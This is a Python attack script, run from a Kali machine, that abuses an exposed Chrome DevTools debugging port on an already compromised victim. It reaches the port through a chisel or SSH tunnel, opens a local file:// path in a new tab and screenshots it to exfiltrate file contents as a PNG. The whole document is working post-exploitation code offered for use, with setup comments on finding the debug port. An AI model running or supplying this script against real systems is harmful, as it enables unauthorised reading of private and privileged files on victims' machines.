#This is tested from a Kali Box
#Run on attacking machine
#EXPLOIT VICTIM and create a reverse port via chisel, ssh, etc. 
#On victim you will need to run PS AUX on Windows it will be procmon or netstat. Look for DEBUG port
#This script will save the file as a visable PNG file in the specified folder

import json
import requests
import websocket
import base64

debugger_address = 'http://localhost:34965' # Change port

response = requests.get(f'{debugger_address}/json')
tabs = response.json()

web_socket_debugger_url = tabs[0]['webSocketDebuggerUrl'].replace('127.0.0.1', 'localhost')

print(f'Connect to url: {web_socket_debugger_url}')

ws = websocket.create_connection(web_socket_debugger_url, suppress_origin=True)

command = json.dumps({
            "id": 5,
            "method": "Target.createTarget",
            "params": {
                "url": "file:///path/file" #put known file name here * sometimes will work
            }
})

ws.send(command)
target_id = json.loads(ws.recv())['result']['targetId']
print(f'Target id: {target_id}')

command = json.dumps({
                "id": 5,
                "method": "Target.attachToTarget",
                "params": {
                    "targetId": target_id,
                    "flatten": True
                }})

ws.send(command)
session_id = json.loads(ws.recv())['params']['sessionId']
print(f'Session id: {session_id}')

command = json.dumps({
            "id": 5,
            "sessionId": session_id,
            "method": "Page.captureScreenshot",
            "params": {
                "sessionId": session_id,
                "format": "png"
            }
        })

ws.send(command)
result = json.loads(ws.recv())

ws.send(command)
result = json.loads(ws.recv())

if 'result' in result and 'data' in result['result']:
    print("Success file reading")
    with open("root.png", "wb") as file:
        file.write(base64.b64decode(result['result']['data']))
else:
    print("Error file reading")

ws.close()
